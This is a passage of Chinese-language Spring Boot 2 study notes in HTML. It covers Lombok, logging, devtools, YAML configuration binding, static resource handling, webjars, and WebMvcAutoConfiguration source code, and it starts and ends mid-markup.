class="hljs-comment">//@AllArgsConstructor</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@ToString</span><br><span class="hljs-meta">@EqualsAndHashCode</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">private</span> Pet pet;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>简化日志开发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handle01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;name&quot;)</span> String name)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;请求进来了....&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Spring Boot 2!&quot;</span>+<span class="hljs-string">&quot;你好：&quot;</span>+name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="18、最佳实践-dev-tools"><a href="#18、最佳实践-dev-tools" class="headerlink" title="18、最佳实践-dev-tools"></a>18、最佳实践-dev-tools</h2><blockquote><p>Spring Boot includes an additional set of tools that can make the application development experience a little more pleasant. The <code>spring-boot-devtools</code> module can be included in any project to provide additional development-time features.——<a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools">link</a></p><p>Applications that use <code>spring-boot-devtools</code> automatically restart whenever files on the classpath change. This can be a useful feature when working in an IDE, as it gives a very fast feedback loop for code changes. By default, any entry on the classpath that points to a directory is monitored for changes. Note that certain resources, such as static assets and view templates, <a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools-restart-exclude">do not need to restart the application</a>.——<a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/html/using-spring-boot.html#using-boot-devtools-restart">link</a></p><p>Triggering a restart</p><p>As DevTools monitors classpath resources, the only way to trigger a restart is to update the classpath. The way in which you cause the classpath to be updated depends on the IDE that you are using:</p><ul><li>In Eclipse, saving a modified file causes the classpath to be updated and triggers a restart.</li><li>In IntelliJ IDEA, building the project (<code>Build -&gt; Build Project</code>)(shortcut: Ctrl+F9) has the same effect.</li></ul></blockquote><p>添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在IDEA中，项目或者页面修改以后：Ctrl+F9。</p><h2 id="19、最佳实践-Spring-Initailizr"><a href="#19、最佳实践-Spring-Initailizr" class="headerlink" title="19、最佳实践-Spring Initailizr"></a>19、最佳实践-Spring Initailizr</h2><p><a href="https://start.spring.io/">Spring Initailizr</a>是创建Spring Boot工程向导。</p><p>在IDEA中，菜单栏New -&gt; Project -&gt; Spring Initailizr。</p><h1 id="SpringBoot2核心技术-核心功能"><a href="#SpringBoot2核心技术-核心功能" class="headerlink" title="SpringBoot2核心技术-核心功能"></a><strong>SpringBoot2核心技术-核心功能</strong></h1><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211458073.jpg" alt="yuque_diagram"></p><p><strong>SpringBoot2核心技术-核心功能</strong></p><h2 id="20、配置文件-yaml的用法"><a href="#20、配置文件-yaml的用法" class="headerlink" title="20、配置文件-yaml的用法"></a>20、配置文件-yaml的用法</h2><p>同以前的properties用法</p><p>YAML 是 “YAML Ain’t Markup Language”（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种标记语言）。 </p><p><strong>非常适合用来做以数据为中心的配置文件</strong>。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul><li>key: value；kv之间有空格</li><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li><li>字符串无需加引号，如果要加，单引号’’、双引号””表示字符串内容会被 转义、不转义</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>字面量：单个的、不可再分的值。date、boolean、string、number、null</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">k:</span> <span class="hljs-string">v</span><br></code></pre></td></tr></table></figure><ul><li>对象：键值对的集合。map、hash、set、object</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#行内写法：  </span><br><br><span class="hljs-attr">k:</span> &#123;<span class="hljs-string">k1:v1</span>,<span class="hljs-string">k2:v2</span>,<span class="hljs-string">k3:v3</span>&#125;<br><br><span class="hljs-comment">#或</span><br><br><span class="hljs-attr">k:</span> <br>  <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span><br>  <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span><br>  <span class="hljs-attr">k3:</span> <span class="hljs-string">v3</span><br></code></pre></td></tr></table></figure><ul><li>数组：一组按次序排列的值。array、list、queue</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#行内写法：  </span><br><br><span class="hljs-attr">k:</span> [<span class="hljs-string">v1</span>,<span class="hljs-string">v2</span>,<span class="hljs-string">v3</span>]<br><br><span class="hljs-comment">#或者</span><br><br><span class="hljs-attr">k:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v1</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v2</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">v3</span><br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> Boolean boss;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>    <span class="hljs-keyword">private</span> String[] interests;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; animal;<br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; score;<br>    <span class="hljs-keyword">private</span> Set&lt;Double&gt; salarys;<br>    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Pet&gt;&gt; allPets;<br>&#125;<br><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Double weight;<br>&#125;<br></code></pre></td></tr></table></figure><p>用yaml表示以上对象</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">userName:</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-attr">boss:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-number">2019</span><span class="hljs-string">/12/12</span> <span class="hljs-number">20</span><span class="hljs-string">:12:33</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">18</span><br>  <span class="hljs-attr">pet:</span> <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">tomcat</span><br>    <span class="hljs-attr">weight:</span> <span class="hljs-number">23.4</span><br>  <span class="hljs-attr">interests:</span> [<span class="hljs-string">篮球</span>,<span class="hljs-string">游泳</span>]<br>  <span class="hljs-attr">animal:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">jerry</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">mario</span><br>  <span class="hljs-attr">score:</span><br>    <span class="hljs-attr">english:</span> <br>      <span class="hljs-attr">first:</span> <span class="hljs-number">30</span><br>      <span class="hljs-attr">second:</span> <span class="hljs-number">40</span><br>      <span class="hljs-attr">third:</span> <span class="hljs-number">50</span><br>    <span class="hljs-attr">math:</span> [<span class="hljs-number">131</span>,<span class="hljs-number">140</span>,<span class="hljs-number">148</span>]<br>    <span class="hljs-attr">chinese:</span> &#123;<span class="hljs-attr">first:</span> <span class="hljs-number">128</span>,<span class="hljs-attr">second:</span> <span class="hljs-number">136</span>&#125;<br>  <span class="hljs-attr">salarys:</span> [<span class="hljs-number">3999</span>,<span class="hljs-number">4999.98</span>,<span class="hljs-number">5999.99</span>]<br>  <span class="hljs-attr">allPets:</span><br>    <span class="hljs-attr">sick:</span><br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">tom</span>&#125;<br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">jerry</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;<br>    <span class="hljs-attr">health:</span> [&#123;<span class="hljs-attr">name:</span> <span class="hljs-string">mario</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;]<br></code></pre></td></tr></table></figure><h2 id="21、配置文件-自定义类绑定的配置提示"><a href="#21、配置文件-自定义类绑定的配置提示" class="headerlink" title="21、配置文件-自定义类绑定的配置提示"></a>21、配置文件-自定义类绑定的配置提示</h2><blockquote><p>You can easily generate your own configuration metadata file from items annotated with <code>@ConfigurationProperties</code> by using the <code>spring-boot-configuration-processor</code> jar. The jar includes a Java annotation processor which is invoked as your project is compiled.——<a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#configuration-metadata-annotation-processor">link</a></p></blockquote><p>自定义的类和配置文件绑定一般没有提示。若要提示，添加如下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 下面插件作用是工程打包时，不将spring-boot-configuration-processor打进包内，让其只在编码的时候有用 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="22、web场景-web开发简介"><a href="#22、web场景-web开发简介" class="headerlink" title="22、web场景-web开发简介"></a>22、web场景-web开发简介</h2><p>Spring Boot provides auto-configuration for Spring MVC that <strong>works well with most applications.(大多场景我们都无需自定义配置)</strong></p><p>The auto-configuration adds the following features on top of Spring’s defaults:</p><ul><li><p>Inclusion of <code>ContentNegotiatingViewResolver</code> and <code>BeanNameViewResolver</code> beans.</p><ul><li>内容协商视图解析器和BeanName视图解析器</li></ul></li><li><p>Support for serving static resources, including support for WebJars (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-static-content">later in this document</a>)).</p><ul><li>静态资源（包括webjars）</li></ul></li><li><p>Automatic registration of <code>Converter</code>, <code>GenericConverter</code>, and <code>Formatter</code> beans.</p><ul><li>自动注册 <code>Converter，GenericConverter，Formatter </code></li></ul></li><li><p>Support for <code>HttpMessageConverters</code> (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-message-converters">later in this document</a>).</p><ul><li>支持 <code>HttpMessageConverters</code> （后来我们配合内容协商理解原理）</li></ul></li><li><p>Automatic registration of <code>MessageCodesResolver</code> (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-message-codes">later in this document</a>).</p><ul><li>自动注册 <code>MessageCodesResolver</code> （国际化用）</li></ul></li><li><p>Static <code>index.html</code> support.</p><ul><li>静态index.html 页支持</li></ul></li><li><p>Custom <code>Favicon</code> support (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-favicon">later in this document</a>).</p><ul><li>自定义 <code>Favicon</code></li></ul></li><li><p>Automatic use of a <code>ConfigurableWebBindingInitializer</code> bean (covered <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/spring-boot-features.html#boot-features-spring-mvc-web-binding-initializer">later in this document</a>).</p><ul><li>自动使用 <code>ConfigurableWebBindingInitializer</code> ，（DataBinder负责将请求数据绑定到JavaBean上）</li></ul></li></ul><blockquote><p>If you want to keep those Spring Boot MVC customizations and make more <a href="https://docs.spring.io/spring/docs/5.2.9.RELEASE/spring-framework-reference/web.html#mvc">MVC customizations</a> (interceptors, formatters, view controllers, and other features), you can add your own <code>@Configuration</code> class of type <code>WebMvcConfigurer</code> but <strong>without</strong> <code>@EnableWebMvc</code>.</p><p><strong>不用@EnableWebMvc注解。使用</strong> <strong><code>@Configuration</code></strong> <strong>+</strong> <strong><code>WebMvcConfigurer</code></strong> <strong>自定义规则</strong></p></blockquote><blockquote><p>If you want to provide custom instances of <code>RequestMappingHandlerMapping</code>, <code>RequestMappingHandlerAdapter</code>, or <code>ExceptionHandlerExceptionResolver</code>, and still keep the Spring Boot MVC customizations, you can declare a bean of type <code>WebMvcRegistrations</code> and use it to provide custom instances of those components.</p><p><strong>声明</strong> <strong><code>WebMvcRegistrations</code></strong> <strong>改变默认底层组件</strong></p></blockquote><blockquote><p>If you want to take complete control of Spring MVC, you can add your own <code>@Configuration</code> annotated with <code>@EnableWebMvc</code>, or alternatively add your own <code>@Configuration</code>-annotated <code>DelegatingWebMvcConfiguration</code> as described in the Javadoc of <code>@EnableWebMvc</code>.</p><p><strong>使用</strong> <strong><code>@EnableWebMvc+@Configuration+DelegatingWebMvcConfiguration 全面接管SpringMVC</code></strong></p></blockquote><h2 id="23、web场景-静态资源规则与定制化"><a href="#23、web场景-静态资源规则与定制化" class="headerlink" title="23、web场景-静态资源规则与定制化"></a>23、web场景-静态资源规则与定制化</h2><h3 id="静态资源目录"><a href="#静态资源目录" class="headerlink" title="静态资源目录"></a>静态资源目录</h3><p>只要静态资源放在类路径下： called <code>/static</code> (or <code>/public</code> or <code>/resources</code> or <code>/META-INF/resources</code></p><p>访问 ： 当前项目根路径&#x2F; + 静态资源名 </p><p>原理： 静态映射&#x2F;**。</p><p>请求进来，先去找Controller看能不能处理。不能处理的所有请求又都交给静态资源处理器。静态资源也找不到则响应404页面。</p><p>也可以改变默认的静态资源路径，<code>/static</code>，<code>/public</code>,<code>/resources</code>, <code>/META-INF/resources</code>失效</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">resources:</span><br>  <span class="hljs-attr">static-locations:</span> [<span class="hljs-string">classpath:/haha/</span>]<br></code></pre></td></tr></table></figure><h3 id="静态资源访问前缀"><a href="#静态资源访问前缀" class="headerlink" title="静态资源访问前缀"></a>静态资源访问前缀</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">static-path-pattern:</span> <span class="hljs-string">/res/**</span><br></code></pre></td></tr></table></figure><p>当前项目 + static-path-pattern + 静态资源名 &#x3D; 静态资源文件夹下找</p><h3 id="webjar"><a href="#webjar" class="headerlink" title="webjar"></a>webjar</h3><p>可用jar方式添加css，js等资源文件，</p><p><a href="https://www.webjars.org/">https://www.webjars.org/</a></p><p>例如，添加jquery</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jquery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问地址：<a href="http://localhost:8080/webjars/jquery/3.5.1/jquery.js">http://localhost:8080/webjars/<strong>jquery&#x2F;3.5.1&#x2F;jquery.js</strong></a>  后面地址要按照依赖里面的包路径。</p><h2 id="24、web场景-welcome与favicon功能"><a href="#24、web场景-welcome与favicon功能" class="headerlink" title="24、web场景-welcome与favicon功能"></a>24、web场景-welcome与favicon功能</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.3.8.RELEASE/reference/htmlsingle/#boot-features-spring-mvc-welcome-page">官方文档</a></p><h3 id="欢迎页支持"><a href="#欢迎页支持" class="headerlink" title="欢迎页支持"></a>欢迎页支持</h3><ul><li><p>静态资源路径下  index.html。</p><ul><li>可以配置静态资源路径</li><li>但是不可以配置静态资源的访问前缀。否则导致 index.html不能被默认访问</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br><span class="hljs-comment">#  mvc:</span><br><span class="hljs-comment">#    static-path-pattern: /res/**   这个会导致welcome page功能失效</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">static-locations:</span> [<span class="hljs-string">classpath:/haha/</span>]<br></code></pre></td></tr></table></figure><ul><li>controller能处理&#x2F;index。</li></ul><h3 id="自定义Favicon"><a href="#自定义Favicon" class="headerlink" title="自定义Favicon"></a>自定义Favicon</h3><p>指网页标签上的小图标。</p><p>favicon.ico 放在静态资源目录下即可。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br><span class="hljs-comment">#  mvc:</span><br><span class="hljs-comment">#    static-path-pattern: /res/**   这个会导致 Favicon 功能失效</span><br></code></pre></td></tr></table></figure><h2 id="25、web场景-【源码分析】-静态资源原理"><a href="#25、web场景-【源码分析】-静态资源原理" class="headerlink" title="25、web场景-【源码分析】-静态资源原理"></a>25、web场景-【源码分析】-静态资源原理</h2><ul><li>SpringBoot启动默认加载  xxxAutoConfiguration 类（自动配置类）</li><li>SpringMVC功能的自动配置类<code>WebMvcAutoConfiguration</code>，生效</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span><br><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span><br><span class="hljs-meta">ValidationAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>给容器中配置的内容：<ul><li>配置文件的相关属性的绑定：WebMvcProperties&#x3D;&#x3D;<strong>spring.mvc</strong>、ResourceProperties&#x3D;&#x3D;<strong>spring.resources</strong></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@Import(EnableWebMvcConfiguration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123; WebMvcProperties.class, ResourceProperties.class &#125;)</span><br><span class="hljs-meta">@Order(0)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfigurationAdapter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置类只有一个有参构造器"><a href="#配置类只有一个有参构造器" class="headerlink" title="配置类只有一个有参构造器"></a>配置类只有一个有参构造器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">////有参构造器所有参数的值都会从容器中确定</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">WebMvcAutoConfigurationAdapter</span><span class="hljs-params">(WebProperties webProperties, WebMvcProperties mvcProperties,</span><br><span class="hljs-params">ListableBeanFactory beanFactory, ObjectProvider&lt;HttpMessageConverters&gt; messageConvertersProvider,</span><br><span class="hljs-params">ObjectProvider&lt;ResourceHandlerRegistrationCustomizer&gt; resourceHandlerRegistrationCustomizerProvider,</span><br><span class="hljs-params">ObjectProvider&lt;DispatcherServletPath&gt; dispatcherServletPath,</span><br><span class="hljs-params">ObjectProvider&lt;ServletRegistrationBean&lt;?&gt;&gt; servletRegistrations)</span> &#123;<br><span class="hljs-built_in">this</span>.mvcProperties = mvcProperties;<br><span class="hljs-built_in">this</span>.beanFactory = beanFactory;<br><span class="hljs-built_in">this</span>.messageConvertersProvider = messageConvertersProvider;<br><span class="hljs-built_in">this</span>.resourceHandlerRegistrationCustomizer = resourceHandlerRegistrationCustomizerProvider.getIfAvailable();<br><span class="hljs-built_in">this</span>.dispatcherServletPath = dispatcherServletPath;<br><span class="hljs-built_in">this</span>.servletRegistrations = servletRegistrations;<br><span class="hljs-built_in">this</span>.mvcProperties.checkConfiguration();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ResourceProperties resourceProperties；获取和spring.resources绑定的所有的值的对象</li><li>WebMvcProperties mvcProperties 获取和spring.mvc绑定的所有的值的对象</li><li>ListableBeanFactory beanFactory Spring的beanFactory</li><li>HttpMessageConverters 找到所有的HttpMessageConverters</li><li>ResourceHandlerRegistrationCustomizer 找到 资源处理器的自定义器。</li><li>DispatcherServletPath</li><li>ServletRegistrationBean   给应用注册Servlet、Filter….</li></ul><h3 id="资源处理的默认规则"><a href="#资源处理的默认规则" class="headerlink" title="资源处理的默认规则"></a>资源处理的默认规则</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 